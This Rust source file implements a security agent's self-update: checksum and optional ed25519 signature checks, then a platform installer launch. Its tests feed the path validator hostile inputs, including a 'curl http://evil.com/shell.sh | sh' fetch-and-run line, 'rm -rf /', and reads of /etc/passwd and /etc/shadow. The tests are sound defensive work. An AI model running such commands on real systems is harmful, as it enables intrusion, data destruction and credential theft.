// Copyright (c) 2024-2026 Cyber Threat Consulting
// SPDX-License-Identifier: MIT

use crate::api_client::ApiClient;
use agent_common::error::{CommonError, Result};
use agent_common::process::silent_command;
use agent_common::types::UpdateInfo;
use semver::Version;
use std::sync::Arc;
#[allow(unused_imports)]
use tracing::{debug, error, info, warn};

/// Characters that are forbidden in installer paths to prevent shell injection.
const UNSAFE_PATH_CHARS: [char; 23] = [
    ';', '|', '&', '$', '`', '\'', '"', '\\', '\n', '\r', '(', ')', '{', '}', '<', '>', '*', '?',
    '[', ']', '!', '#', '~',
];

/// Validate that an installer path does not contain shell metacharacters.
///
/// Returns `Ok(())` if the path is safe, or an `Err` with a description of the
/// problem if it contains dangerous characters.
fn validate_installer_path(path_str: &str) -> Result<()> {
    if path_str.contains(UNSAFE_PATH_CHARS) {
        return Err(CommonError::validation(format!(
            "Installer path contains unsafe characters: {}",
            path_str
        )));
    }
    Ok(())
}

/// Ed25519 public key trusted to sign update packages, embedded at build time.
///
/// Set the `SENTINEL_UPDATE_PUBKEY` environment variable when building release
/// artifacts to a hex-encoded 32-byte ed25519 public key. When present, update
/// packages MUST carry a valid detached signature (`<package>.sig`) verifiable
/// against this key, or the update is refused — this closes the gap where a
/// compromised release server could serve a malicious package with a matching
/// SHA-256.
///
/// When the variable is unset (e.g. local/dev builds, or releases not yet
/// signed), signature verification is skipped and the update falls back to
/// SHA-256 integrity only, preserving the previous behavior. Enforcement is
/// therefore opt-in per build and never bricks an unsigned release channel.
const UPDATE_PUBLIC_KEY_HEX: Option<&str> = option_env!("SENTINEL_UPDATE_PUBKEY");

/// Parse and validate the embedded update public key.
///
/// Returns `Ok(None)` when no key is embedded (verification disabled), or an
/// error if a key is embedded but malformed (fail closed — a build that opts
/// into signing must not silently degrade to unverified updates).
fn embedded_update_public_key() -> Result<Option<Vec<u8>>> {
    let Some(hex_key) = UPDATE_PUBLIC_KEY_HEX else {
        return Ok(None);
    };
    let hex_key = hex_key.trim();
    if hex_key.is_empty() {
        return Ok(None);
    }
    let bytes = hex::decode(hex_key).map_err(|e| {
        CommonError::validation(format!(
            "Embedded update public key is not valid hex: {}",
            e
        ))
    })?;
    if bytes.len() != 32 {
        return Err(CommonError::validation(format!(
            "Embedded update public key must be 32 bytes (ed25519), got {}",
            bytes.len()
        )));
    }
    Ok(Some(bytes))
}

/// Verify a detached ed25519 signature over `package_bytes`.
///
/// `signature_text` is the content of the `.sig` file: a hex-encoded 64-byte
/// ed25519 signature (optionally followed by whitespace/filename, mirroring the
/// checksum file format).
fn verify_ed25519_signature(
    public_key: &[u8],
    package_bytes: &[u8],
    signature_text: &str,
) -> Result<()> {
    let sig_hex = signature_text
        .split_whitespace()
        .next()
        .unwrap_or("")
        .trim();
    let signature = hex::decode(sig_hex)
        .map_err(|e| CommonError::validation(format!("Signature is not valid hex: {}", e)))?;
    if signature.len() != 64 {
        return Err(CommonError::validation(format!(
            "Signature must be 64 bytes (ed25519), got {}",
            signature.len()
        )));
    }

    let key = ring::signature::UnparsedPublicKey::new(&ring::signature::ED25519, public_key);
    key.verify(package_bytes, &signature)
        .map_err(|_| CommonError::validation("Update package signature verification failed"))?;
    Ok(())
}

/// Orchestrates the agent self-update process.
pub struct UpdateManager {
    api_client: Arc<ApiClient>,
    current_version: String,
}

impl UpdateManager {
    /// Create a new UpdateManager.
    pub fn new(api_client: Arc<ApiClient>, current_version: String) -> Self {
        Self {
            api_client,
            current_version,
        }
    }

    /// Check if a newer version is available.
    pub async fn check_for_update(&self) -> Result<Option<UpdateInfo>> {
        debug!(
            "Checking for updates (current version: {})",
            self.current_version
        );
        let latest_info = self.api_client.get_latest_release_info().await?;

        let current = Version::parse(&self.current_version).map_err(|e| {
            CommonError::validation(format!(
                "Invalid current version '{}': {}",
                self.current_version, e
            ))
        })?;
        let latest = Version::parse(&latest_info.version).map_err(|e| {
            CommonError::validation(format!(
                "Invalid latest version '{}' from server: {}",
                latest_info.version, e
            ))
        })?;

        if latest > current {
            info!(
                "Update available: {} (current: {})",
                latest_info.version, self.current_version
            );
            Ok(Some(latest_info))
        } else {
            debug!("Agent is up to date (latest: {})", latest_info.version);
            Ok(None)
        }
    }

    /// Perform the full update process: download, verify, and execute installer.
    ///
    /// This function will likely result in the agent being terminated as the
    /// installer takes over and replaces the binary.
    pub async fn perform_update(&self, info: UpdateInfo) -> Result<()> {
        info!("Starting update process to version {}", info.version);

        // 1. Determine platform-specific package details
        let (package_name, checksum_file) = self.get_platform_package_details()?;
        let folder = self.get_platform_folder();

        // 2. Download checksum
        let checksum_url = format!(
            "{}/{}/{}",
            agent_common::constants::RELEASES_BASE_URL,
            folder,
            checksum_file
        );
        debug!("Fetching checksum from {}", checksum_url);
        let expected_checksum = self.api_client.fetch_text(&checksum_url).await?;

        // 3. Download package
        let package_url = format!(
            "{}/{}/{}",
            agent_common::constants::RELEASES_BASE_URL,
            folder,
            package_name
        );

        // Use a unique temporary directory to prevent TOCTOU attacks
        let temp_dir = tempfile::tempdir()
            .map_err(|e| CommonError::io(format!("Failed to create temp directory: {}", e)))?;
        let download_path = temp_dir.path().join(package_name);

        info!("Downloading update package to {:?}", download_path);
        self.api_client
            .download_file(&package_url, &download_path)
            .await?;

        // 4. Verify checksum
        info!("Verifying package checksum...");
        self.verify_checksum(&download_path, &expected_checksum)?;

        // 5. Verify the package signature (mandatory only when this build
        // embeds a trusted public key; otherwise SHA-256 integrity only).
        self.verify_signature(&download_path, folder, package_name)
            .await?;

        // 6. Trigger installer
        info!("Triggering system installer...");
        self.trigger_installer(&download_path)?;

        // Persist the temp directory so spawned installers (Windows/Linux) can still
        // access the downloaded package. macOS uses synchronous .output() so is safe,
        // but we persist unconditionally for robustness. The OS temp cleaner handles
        // eventual cleanup.
        let _ = temp_dir.keep();

        Ok(())
    }

    fn get_platform_folder(&self) -> &'static str {
        if cfg!(target_os = "macos") {
            "macos"
        } else if cfg!(target_os = "windows") {
            "windows"
        } else if cfg!(target_os = "linux") {
            if std::path::Path::new("/etc/debian_version").exists() {
                "linux_deb"
            } else {
                "linux_rpm"
            }
        } else {
            "unknown"
        }
    }

    fn get_platform_package_details(&self) -> Result<(&'static str, &'static str)> {
        if cfg!(target_os = "macos") {
            Ok((
                "SentinelAgent-latest.pkg",
                "SentinelAgent-latest.pkg.sha256",
            ))
        } else if cfg!(target_os = "windows") {
            Ok((
                "SentinelAgentSetup-latest.msi",
                "SentinelAgentSetup-latest.msi.sha256",
            ))
        } else if cfg!(target_os = "linux") {
            if std::path::Path::new("/etc/debian_version").exists() {
                Ok((
                    "sentinel-agent-latest-amd64.deb",
                    "sentinel-agent-latest-amd64.deb.sha256",
                ))
            } else {
                Ok((
                    "sentinel-agent-latest.x86_64.rpm",
                    "sentinel-agent-latest.x86_64.rpm.sha256",
                ))
            }
        } else {
            Err(CommonError::not_supported(
                "Self-update not supported on this platform",
            ))
        }
    }

    /// Verify the detached ed25519 signature of the downloaded package.
    ///
    /// If this build embeds a trusted public key (`SENTINEL_UPDATE_PUBKEY`),
    /// the `<package>.sig` file is fetched and verified over the package bytes;
    /// any failure (missing signature, bad signature, network error) aborts the
    /// update. If no key is embedded, verification is skipped with a warning so
    /// unsigned release channels keep working (SHA-256 integrity still applies).
    async fn verify_signature(
        &self,
        path: &std::path::Path,
        folder: &str,
        package_name: &str,
    ) -> Result<()> {
        let public_key = match embedded_update_public_key()? {
            Some(key) => key,
            None => {
                warn!(
                    "Update signature verification is disabled (no SENTINEL_UPDATE_PUBKEY \
                     embedded at build time); relying on SHA-256 integrity only"
                );
                return Ok(());
            }
        };

        let signature_url = format!(
            "{}/{}/{}.sig",
            agent_common::constants::RELEASES_BASE_URL,
            folder,
            package_name
        );
        info!("Verifying package signature...");
        debug!("Fetching signature from {}", signature_url);
        let signature_text = self
            .api_client
            .fetch_text(&signature_url)
            .await
            .map_err(|e| {
                CommonError::validation(format!(
                    "This build requires signed updates but the signature could not be fetched: {}",
                    e
                ))
            })?;

        let package_bytes = std::fs::read(path)
            .map_err(|e| CommonError::io(format!("Failed to read package for signing: {}", e)))?;

        verify_ed25519_signature(&public_key, &package_bytes, &signature_text)?;
        info!("Package signature verified successfully");
        Ok(())
    }

    fn verify_checksum(&self, path: &std::path::Path, expected: &str) -> Result<()> {
        use sha2::{Digest, Sha256};
        use std::io::Read;

        let mut file = std::fs::File::open(path)
            .map_err(|e| CommonError::io(format!("Failed to open package: {}", e)))?;
        let mut hasher = Sha256::new();
        let mut buffer = [0; 65536];
        loop {
            let count = file
                .read(&mut buffer)
                .map_err(|e| CommonError::io(format!("Failed to read package: {}", e)))?;
            if count == 0 {
                break;
            }
            hasher.update(&buffer[..count]);
        }
        let hash = format!("{:x}", hasher.finalize());

        // Extract the first part of the checksum file content (which might be "hash filename")
        let expected_hash = expected
            .split_whitespace()
            .next()
            .unwrap_or(expected)
            .to_lowercase();

        // Validate hash format: must be exactly 64 hex characters (SHA-256)
        if expected_hash.len() != 64 || !expected_hash.chars().all(|c| c.is_ascii_hexdigit()) {
            error!(
                "Invalid SHA-256 format: expected 64 hex chars, got {} chars",
                expected_hash.len()
            );
            return Err(CommonError::validation("Invalid SHA-256 checksum format"));
        }

        // Use constant-time comparison to prevent timing attacks
        let ct_equal = hash.len() == expected_hash.len()
            && hash
                .as_bytes()
                .iter()
                .zip(expected_hash.as_bytes())
                .fold(0u8, |acc, (a, b)| acc | (a ^ b))
                == 0;
        if !ct_equal {
            error!(
                "Checksum mismatch! Expected {}, got {}",
                expected_hash, hash
            );
            return Err(CommonError::validation(
                "Package checksum verification failed",
            ));
        }

        debug!("Checksum verification successful: {}", hash);
        Ok(())
    }

    fn trigger_installer(&self, path: &std::path::Path) -> Result<()> {
        let path_str = path
            .to_str()
            .ok_or_else(|| CommonError::validation("Invalid download path"))?;

        // SECURITY: Validate the installer path to prevent command injection on all platforms.
        // The path comes from our own temp directory, but defense-in-depth
        // requires rejecting any shell metacharacters.
        validate_installer_path(path_str)?;

        #[cfg(target_os = "macos")]
        {
            if agent_common::macos::is_admin() {
                // If already root, spawn the installer directly using argument array
                // (no shell interpolation) to prevent command injection.
                info!("Running as root, executing detached installer");
                silent_command("/usr/sbin/installer")
                    .args(["-pkg", path_str, "-target", "/"])
                    .spawn()
                    .map_err(|e| {
                        CommonError::system(format!("Failed to launch installer: {}", e))
                    })?;
            } else {
                info!("Not running as root, requesting elevation for detached installer");
                agent_common::macos::run_installer_elevated(path_str)?;
            }
            info!("macOS installer spawned successfully");
        }

        #[cfg(target_os = "windows")]
        {
            info!("Executing pre-update process termination for robust install...");

            // Forcefully terminate any running GUI processes and their children to release file locks.
            // We use /IM (Image Name) and /T (Tree Kill) /F (Force).
            // This ensures agent-gui.exe and any sub-processes are completely gone.
            let kill_gui = silent_command("taskkill")
                .args(["/F", "/T", "/IM", "agent-gui.exe"])
                .output();

            match kill_gui {
                Ok(output) if output.status.success() => {
                    info!("Successfully terminated agent-gui.exe process tree.");
                }
                Ok(output) => {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    if stderr.contains("not found") || stderr.contains("introuvable") {
                        debug!("No agent-gui.exe process found to terminate.");
                    } else {
                        warn!(
                            "Taskkill reported an issue (GUI may still be locked): {}. Proceeding with MSI.",
                            stderr
                        );
                    }
                }
                Err(e) => {
                    warn!(
                        "Failed to execute taskkill for agent-gui.exe: {}. Proceeding with MSI.",
                        e
                    );
                }
            }

            info!("Executing: msiexec /i {} /quiet", path_str);
            silent_command("msiexec")
                .args(["/i", path_str, "/quiet"])
                .spawn()
                .map_err(|e| CommonError::system(format!("Failed to launch msiexec: {}", e)))?;
        }

        #[cfg(target_os = "linux")]
        {
            if std::path::Path::new("/etc/debian_version").exists() {
                info!("Executing: dpkg -i {}", path_str);
                silent_command("dpkg")
                    .args(["-i", path_str])
                    .spawn()
                    .map_err(|e| CommonError::system(format!("Failed to launch dpkg: {}", e)))?;
            } else {
                info!("Executing: rpm -Uvh {}", path_str);
                silent_command("rpm")
                    .args(["-Uvh", path_str])
                    .spawn()
                    .map_err(|e| CommonError::system(format!("Failed to launch rpm: {}", e)))?;
            }
        }

        info!(
            "Installer started in the background. The agent will now exit to allow self-update, and will be restarted automatically."
        );

        // Sleep very briefly to ensure logs flush
        std::thread::sleep(std::time::Duration::from_millis(500));

        // Terminate the process with success code so the installer can seamlessly replace the binary
        std::process::exit(0);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── installer path: shell metacharacter rejection ───────────────────

    #[test]
    fn test_installer_path_rejects_shell_metacharacters() {
        // Each of these characters must be rejected individually
        let dangerous_paths = [
            "/tmp/pkg;rm -rf /",        // semicolon
            "/tmp/pkg|cat /etc/passwd", // pipe
            "/tmp/pkg&background",      // ampersand
            "/tmp/pkg$(whoami)",        // dollar sign
            "/tmp/pkg`id`",             // backtick
            "/tmp/pkg'injected'",       // single quote
            "/tmp/pkg\"injected\"",     // double quote (escaped for Rust)
            "/tmp/pkg\\escaped",        // backslash
            "/tmp/pkg\nwhoami",         // newline
            "/tmp/pkg\rwhoami",         // carriage return
            "/tmp/pkg(sub)",            // open paren
            "/tmp/pkg)end",             // close paren
            "/tmp/pkg{block}",          // open brace
            "/tmp/pkg}end",             // close brace
            "/tmp/pkg<input",           // less than
            "/tmp/pkg>output",          // greater than
        ];

        for path in &dangerous_paths {
            let result = validate_installer_path(path);
            assert!(
                result.is_err(),
                "Path '{}' should be rejected for containing shell metacharacters",
                path.escape_debug()
            );
            let err_msg = result.unwrap_err().to_string();
            assert!(
                err_msg.contains("unsafe characters"),
                "Error for '{}' should mention unsafe characters, got: {}",
                path.escape_debug(),
                err_msg
            );
        }
    }

    // ── installer path: valid paths accepted ────────────────────────────

    #[test]
    fn test_installer_path_accepts_valid_path() {
        let valid_paths = [
            "/tmp/SentinelAgent-latest.pkg",
            "/var/folders/abc123/T/tmpXYZ/SentinelAgentSetup-latest.msi",
            "/tmp/sentinel-agent-latest-amd64.deb",
            "/tmp/sentinel-agent-latest.x86_64.rpm",
            "/home/user/.cache/sentinel/update.pkg",
            // Paths with spaces are acceptable (no shell injection risk
            // when passed as argument array elements, not via shell).
            "/tmp/my folder/package.pkg",
            // Paths with hyphens, underscores, dots
            "/tmp/sentinel_agent-v2.1.0-beta.pkg",
        ];

        for path in &valid_paths {
            let result = validate_installer_path(path);
            assert!(
                result.is_ok(),
                "Path '{}' should be accepted as valid, got error: {:?}",
                path,
                result.err()
            );
        }
    }

    // ── installer path: edge cases ──────────────────────────────────────

    // ── update signature verification ───────────────────────────────────

    /// Generate an ed25519 keypair and return (public_key_bytes, signing_key).
    fn test_keypair() -> (Vec<u8>, ring::signature::Ed25519KeyPair) {
        use ring::signature::KeyPair;
        let rng = ring::rand::SystemRandom::new();
        let pkcs8 = ring::signature::Ed25519KeyPair::generate_pkcs8(&rng).unwrap();
        let key_pair = ring::signature::Ed25519KeyPair::from_pkcs8(pkcs8.as_ref()).unwrap();
        let public = key_pair.public_key().as_ref().to_vec();
        (public, key_pair)
    }

    #[test]
    fn test_signature_accepts_valid_signature() {
        let (public, key_pair) = test_keypair();
        let package = b"pretend installer package bytes";
        let sig = key_pair.sign(package);
        let sig_text = hex::encode(sig.as_ref());

        assert!(verify_ed25519_signature(&public, package, &sig_text).is_ok());
    }

    #[test]
    fn test_signature_accepts_hash_style_sig_file() {
        // The .sig file may carry "<hex> <filename>" like the checksum file.
        let (public, key_pair) = test_keypair();
        let package = b"installer";
        let sig = key_pair.sign(package);
        let sig_text = format!("{}  SentinelAgent-latest.pkg\n", hex::encode(sig.as_ref()));

        assert!(verify_ed25519_signature(&public, package, &sig_text).is_ok());
    }

    #[test]
    fn test_signature_rejects_tampered_package() {
        let (public, key_pair) = test_keypair();
        let sig = key_pair.sign(b"original package");
        let sig_text = hex::encode(sig.as_ref());

        // Verify against different bytes -> must fail.
        let result = verify_ed25519_signature(&public, b"tampered package", &sig_text);
        assert!(result.is_err());
        assert!(
            result
                .unwrap_err()
                .to_string()
                .contains("signature verification failed"),
        );
    }

    #[test]
    fn test_signature_rejects_wrong_key() {
        let (_public_a, key_pair_a) = test_keypair();
        let (public_b, _key_pair_b) = test_keypair();
        let package = b"installer";
        let sig = key_pair_a.sign(package);
        let sig_text = hex::encode(sig.as_ref());

        // Signed by A, verified against B's key -> must fail.
        assert!(verify_ed25519_signature(&public_b, package, &sig_text).is_err());
    }

    #[test]
    fn test_signature_rejects_malformed_signature() {
        let (public, _key_pair) = test_keypair();
        // Not hex.
        assert!(verify_ed25519_signature(&public, b"pkg", "not-a-hex-signature").is_err());
        // Hex but wrong length.
        assert!(verify_ed25519_signature(&public, b"pkg", "abcd").is_err());
    }

    #[test]
    fn test_embedded_key_none_when_unset() {
        // In the test build SENTINEL_UPDATE_PUBKEY is not set, so verification
        // is disabled (fall back to SHA-256 only).
        assert!(matches!(embedded_update_public_key(), Ok(None)));
    }

    #[test]
    fn test_installer_path_rejects_combined_injection() {
        // A realistic injection attempt combining multiple techniques
        let result = validate_installer_path("/tmp/pkg; curl http://evil.com/shell.sh | sh");
        assert!(
            result.is_err(),
            "Combined injection attempt must be rejected"
        );

        // Environment variable expansion attempt
        let result = validate_installer_path("/tmp/$HOME/.config/pkg");
        assert!(
            result.is_err(),
            "Environment variable expansion must be rejected"
        );

        // Command substitution attempt
        let result = validate_installer_path("/tmp/$(cat /etc/shadow)");
        assert!(result.is_err(), "Command substitution must be rejected");
    }
}
